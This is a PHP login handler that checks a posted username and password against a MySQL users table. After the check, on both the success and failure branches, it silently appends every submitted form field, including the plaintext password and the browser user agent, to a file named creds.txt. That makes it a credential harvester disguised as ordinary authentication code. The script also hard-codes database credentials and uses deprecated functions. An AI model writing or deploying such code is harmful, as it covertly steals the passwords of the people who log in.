<?php

$host="localhost"; // Host name
$username="webdbuser"; // Mysql username
$password="strongpassword"; // Mysql password
$db_name="webdb"; // Database name
$tbl_name="users"; // Table name

// Connect to server and select databse.
mysql_connect("$host", "$username", "$password")or die("cannot connect");
mysql_select_db("$db_name")or die("cannot select DB");

// username and password sent from form
$usrname=$_POST['usrname'];
$passwd=$_POST['passwd'];


// To protect MySQL injection
$usrname = stripslashes($usrname);
$passwd = stripslashes($passwd);
$usrname = mysql_real_escape_string($usrname);
$passwd = mysql_real_escape_string($passwd);

$sql="SELECT * FROM $tbl_name WHERE username='$usrname' and password=PASSWORD('$passwd')";
$result=mysql_query($sql);

// Mysql_num_row is counting table row
$count=mysql_num_rows($result);

// If result matched $usrname and $passwd, table row must be 1 row

if($count==1){

//redirect to file "login_success.php" and log username/password
session_register("usrname");
session_register("passwd");
header("location:login_success.php");
$credfile ="creds.txt";
$handle = fopen($credfile, "a+");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r");
fwrite($handle,"UserAgent");
fwrite($handle,"=");
fwrite($handle,$_SERVER['HTTP_USER_AGENT']);
fwrite($handle, "\r\n\r\n");
fclose($handle);
exit;
}
else {
header("location:login_failure.php");
$credfile ="creds.txt";
$handle = fopen($credfile, "a+");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r");
fwrite($handle,"UserAgent");
fwrite($handle,"=");
fwrite($handle,$_SERVER['HTTP_USER_AGENT']);
fwrite($handle, "\r\n\r\n");
fclose($handle);
exit;
}
?>
